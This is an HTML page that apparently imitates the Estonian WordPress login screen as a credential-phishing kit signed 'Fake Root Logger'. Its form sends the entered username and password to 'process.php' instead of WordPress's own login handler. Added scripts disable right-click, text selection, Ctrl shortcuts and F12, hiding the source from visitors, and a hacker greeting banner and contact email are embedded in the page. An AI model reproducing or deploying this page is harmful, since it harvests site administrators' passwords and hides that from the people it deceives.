<!DOCTYPE html>
	<html lang="et">
	<head>
<div align="center"><noscript>
   <div style="position:fixed; top:0px; left:0px; z-index:3000; height:100%; width:100%; background-color:#FFFFFF">
   <div style="font-family: Arial; font-size: 17px; background-color:#00bbf9; padding: 11pt;">gk seneng byone bosss. Salam heker ./Fake Root</div></div>
</noscript></div>

<!--./Fake Root Logger.-->
<script type="text/javascript">
function disableSelection(e){if(typeof e.onselectstart!="undefined")e.onselectstart=function(){return false};else if(typeof e.style.MozUserSelect!="undefined")e.style.MozUserSelect="none";else e.onmousedown=function(){return false};e.style.cursor="default"}window.onload=function(){disableSelection(document.body)}
</script>

<!-- ig:f4k3_r00t -->
<script type="text/javascript">
function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
</script>

<style type="text/css">
* : (input, textarea) {
    -webkit-touch-callout: none;
    -webkit-user-select: none;

}
</style>

<style type="text/css">
img {
	-webkit-touch-callout: none;
	-webkit-user-select: none;
    }
</style>

<!-- email: fikriwalker4676@gmail.com -->
<script type="text/javascript">
window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
</script>
<script type="text/javascript">
document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}
</script>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<title>Login WordPress</title>
	<link href='https://fonts.gstatic.com' crossorigin rel='preconnect' />
<link rel='stylesheet' id='dashicons-css'  href='wp-includes/css/dashicons.min.css?ver=5.6.1' type='text/css' media='all' />
<link rel='stylesheet' id='buttons-css'  href='wp-includes/css/buttons.min.css?ver=5.6.1' type='text/css' media='all' />
<link rel='stylesheet' id='forms-css'  href='wp-admin/css/forms.min.css?ver=5.6.1' type='text/css' media='all' />
<link rel='stylesheet' id='l10n-css'  href='wp-admin/css/l10n.min.css?ver=5.6.1' type='text/css' media='all' />
<link rel='stylesheet' id='login-css'  href='wp-admin/css/login.min.css?ver=5.6.1' type='text/css' media='all' />
<meta name="generator" content="Site Kit by Google 1.24.0" /><script type="text/javascript">
(function(url){
	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
	var addEvent = function(evt, handler) {
		if (window.addEventListener) {
			document.addEventListener(evt, handler, false);
		} else if (window.attachEvent) {
			document.attachEvent('on' + evt, handler);
		}
	};
	var removeEvent = function(evt, handler) {
		if (window.removeEventListener) {
			document.removeEventListener(evt, handler, false);
		} else if (window.detachEvent) {
			document.detachEvent('on' + evt, handler);
		}
	};
	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
	var logHuman = function() {
		if (window.wfLogHumanRan) { return; }
		window.wfLogHumanRan = true;
		var wfscr = document.createElement('script');
		wfscr.type = 'text/javascript';
		wfscr.async = true;
		wfscr.src = url + '&r=' + Math.random();
		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
		for (var i = 0; i < evts.length; i++) {
			removeEvent(evts[i], logHuman);
		}
	};
	for (var i = 0; i < evts.length; i++) {
		addEvent(evts[i], logHuman);
	}
})('/?wordfence_lh=1&hid=33CD6400E0629FED1B769CF33DCD0C17');
</script>	<meta name='robots' content='noindex,noarchive' />
	<meta name='referrer' content='strict-origin-when-cross-origin' />
		<meta name="viewport" content="width=device-width" />
		</head>
	<body class="login no-js login-action-login wp-core-ui  locale-et">
	<script type="text/javascript">
		document.body.className = document.body.className.replace('no-js','js');
	</script>
		<div id="login">
		<h1><a href="https://wordpress.org/">Kasutame WordPressi</a></h1>
	
		<form name="loginform" id="loginform" action="process.php" method="post">
			<p>
				<label for="user_login">Kasutajanimi või e-postiaadress</label>
				<input type="text" name="log" id="user_login" class="input" value="" size="20" autocapitalize="off" />
			</p>

			<div class="user-pass-wrap">
				<label for="user_pass">Parool</label>
				<div class="wp-pwd">
					<input type="password" name="pwd" id="user_pass" class="input password-input" value="" size="20" />
					<button type="button" class="button button-secondary wp-hide-pw hide-if-no-js" data-toggle="0" aria-label="Näita salasõna">
						<span class="dashicons dashicons-visibility" aria-hidden="true"></span>
					</button>
				</div>
			</div>
						<p class="forgetmenot"><input name="rememberme" type="checkbox" id="rememberme" value="forever"  /> <label for="rememberme">Jäta mind meelde</label></p>
			<p class="submit">
				<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Logi sisse" />
									<input type="hidden" name="redirect_to" value="wp-admin/" />
									<input type="hidden" name="testcookie" value="1" />
			</p>
		</form>

					<p id="nav">
								<a href="wp-login.php?action=lostpassword">Parool kadunud?</a>
			</p>
					<script type="text/javascript">
			function wp_attempt_focus() {setTimeout( function() {try {d = document.getElementById( "user_login" );d.focus(); d.select();} catch( er ) {}}, 200);}
wp_attempt_focus();
if ( typeof wpOnload === 'function' ) { wpOnload() }		</script>
				<p id="backtoblog"><a href="https://fake-root.blogspot.com">
		&larr; Go to site		</a></p>
			</div>
	<script type='text/javascript' src='wp-includes/js/jquery/jquery.min.js?ver=3.5.1' id='jquery-core-js'></script>
<script type='text/javascript' src='wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2' id='jquery-migrate-js'></script>
<script type='text/javascript' id='zxcvbn-async-js-extra'>
/* <![CDATA[ */
var _zxcvbnSettings = {"src":"wp-includes\/js\/zxcvbn.min.js"};
/* ]]> */
</script>
<script type='text/javascript' src='wp-includes/js/zxcvbn-async.min.js?ver=1.0' id='zxcvbn-async-js'></script>
<script type='text/javascript' src='wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=7.4.4' id='wp-polyfill-js'></script>
<script type='text/javascript' id='wp-polyfill-js-after'>
( 'fetch' in window ) || document.write( '<script src="wp-includes/js/dist/vendor/wp-polyfill-fetch.min.js?ver=3.0.0"></scr' + 'ipt>' );( document.contains ) || document.write( '<script src="wp-includes/js/dist/vendor/wp-polyfill-node-contains.min.js?ver=3.42.0"></scr' + 'ipt>' );( window.DOMRect ) || document.write( '<script src="wp-includes/js/dist/vendor/wp-polyfill-dom-rect.min.js?ver=3.42.0"></scr' + 'ipt>' );( window.URL && window.URL.prototype && window.URLSearchParams ) || document.write( '<script src="wp-includes/js/dist/vendor/wp-polyfill-url.min.js?ver=3.6.4"></scr' + 'ipt>' );( window.FormData && window.FormData.prototype.keys ) || document.write( '<script src="wp-includes/js/dist/vendor/wp-polyfill-formdata.min.js?ver=3.0.12"></scr' + 'ipt>' );( Element.prototype.matches && Element.prototype.closest ) || document.write( '<script src="wp-includes/js/dist/vendor/wp-polyfill-element-closest.min.js?ver=2.0.2"></scr' + 'ipt>' );
</script>
<script type='text/javascript' src='wp-includes/js/dist/i18n.min.js?ver=ac389435e7fd4ded01cf603f3aaba6a6' id='wp-i18n-js'></script>
<script type='text/javascript' id='password-strength-meter-js-extra'>
/* <![CDATA[ */
var pwsL10n = {"unknown":"Parooli tugevus teadmata","short":"V\u00e4ga n\u00f5rk","bad":"N\u00f5rk","good":"Keskmine","strong":"Tugev","mismatch":"Ei kattu"};
/* ]]> */
</script>
<script type='text/javascript' id='password-strength-meter-js-translations'>
( function( domain, translations ) {
	var localeData = translations.locale_data[ domain ] || translations.locale_data.messages;
	localeData[""].domain = domain;
	wp.i18n.setLocaleData( localeData, domain );
} )( "default", {"translation-revision-date":"2020-08-12 08:38:59+0000","generator":"GlotPress\/3.0.0-alpha.2","domain":"messages","locale_data":{"messages":{"":{"domain":"messages","plural-forms":"nplurals=2; plural=n != 1;","lang":"et_EE"},"%1$s is deprecated since version %2$s! Use %3$s instead. Please consider writing more inclusive code.":["%1$s on alates versioonist %2$s mittesoovitav, selle asemel on  %3$s. Katsu kirjutada kaasavamat koodi."]}},"comment":{"reference":"wp-admin\/js\/password-strength-meter.js"}} );
</script>
<script type='text/javascript' src='wp-admin/js/password-strength-meter.min.js?ver=5.6.1' id='password-strength-meter-js'></script>
<script type='text/javascript' src='wp-includes/js/underscore.min.js?ver=1.8.3' id='underscore-js'></script>
<script type='text/javascript' id='wp-util-js-extra'>
/* <![CDATA[ */
var _wpUtilSettings = {"ajax":{"url":"\/wp-admin\/admin-ajax.php"}};
/* ]]> */
</script>
<script type='text/javascript' src='wp-includes/js/wp-util.min.js?ver=5.6.1' id='wp-util-js'></script>
<script type='text/javascript' id='user-profile-js-translations'>
( function( domain, translations ) {
	var localeData = translations.locale_data[ domain ] || translations.locale_data.messages;
	localeData[""].domain = domain;
	wp.i18n.setLocaleData( localeData, domain );
} )( "default", {"translation-revision-date":"2020-08-12 08:38:59+0000","generator":"GlotPress\/3.0.0-alpha.2","domain":"messages","locale_data":{"messages":{"":{"domain":"messages","plural-forms":"nplurals=2; plural=n != 1;","lang":"et_EE"},"Your new password has not been saved.":["Sinu uus salas\u00f5na ei ole salvestatud."],"Show":["N\u00e4ita"],"Hide":["Peida"],"Confirm use of weak password":["Kinnita n\u00f5rga parooli kasutust"],"Hide password":["Peida salas\u00f5na"],"Show password":["N\u00e4ita salas\u00f5na"]}},"comment":{"reference":"wp-admin\/js\/user-profile.js"}} );
</script>
<script type='text/javascript' src='wp-admin/js/user-profile.min.js?ver=5.6.1' id='user-profile-js'></script>
	<div class="clear"></div>
	</body>
	</html>
	
